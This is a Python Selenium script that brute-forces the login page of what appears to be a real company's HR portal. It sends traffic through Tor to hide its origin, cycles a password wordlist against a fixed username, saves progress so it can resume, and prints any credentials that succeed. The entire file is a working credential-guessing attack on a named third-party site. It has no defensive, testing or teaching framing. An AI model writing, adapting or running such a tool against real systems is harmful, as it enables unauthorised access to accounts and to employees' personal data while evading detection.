from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.common.keys import Keys
import time
import os

# Setup for resuming capability
def save_last_attempt(username, password):
    with open('last_attempt.txt', 'w') as file:
        file.write(f'{username},{password}')

def load_last_attempt():
    if os.path.exists('last_attempt.txt'):
        with open('last_attempt.txt', 'r') as file:
            last_username, last_password = file.read().split(',')
            return last_username, last_password
    return None, None

# Path to GeckoDriver and Firefox
gecko_driver_path = '/usr/local/bin/geckodriver'
firefox_path = '/usr/bin/firefox-esr'

# Set up options for Firefox to use Tor
options = webdriver.FirefoxOptions()
options.binary_location = firefox_path
options.add_argument('--proxy-server=socks5://127.0.0.1:9050')

# Initialize the WebDriver with the Service object
service = Service(executable_path=gecko_driver_path, log_path='/home/geckodriver.log')
driver = webdriver.Firefox(service=service, options=options)

# URL of the login page
login_url = 'https://textrip.peopleshr.com/hr/security/login'
driver.get(login_url)

# Load usernames and wordlist here
usernames = ['user']
with open('/home/wordlist_temp.txt', 'r') as file:
    passwords = file.read().splitlines()

# Load last attempt to start from there
last_username, last_password = load_last_attempt()
start_from_last = (last_username is not None and last_password is not None)

# Loop through usernames and passwords
for username in usernames:
    for password in passwords:
        if start_from_last:
            # Start from the last attempt if it matches
            if username == last_username and password == last_password:
                start_from_last = False
            continue

        save_last_attempt(username, password)  # Save before attempting
        try:
            username_field = driver.find_element(By.NAME, 'UserName')
            password_field = driver.find_element(By.NAME, 'Password')

            username_field.clear()
            password_field.clear()

            username_field.send_keys(username)
            password_field.send_keys(password)
            password_field.send_keys(Keys.RETURN)

            time.sleep(2)  # Adjust based on server response time

            if "dashboard" in driver.current_url:
                print(f"Successful login with {username}:{password}")
                break  # Exit the loop if successful
            else:
                print(f"Attempted login with {username}:{password}")
        except Exception as e:
            print(f"Error during login attempt with {username}:{password} - {e}")

# Close the WebDriver
driver.quit()
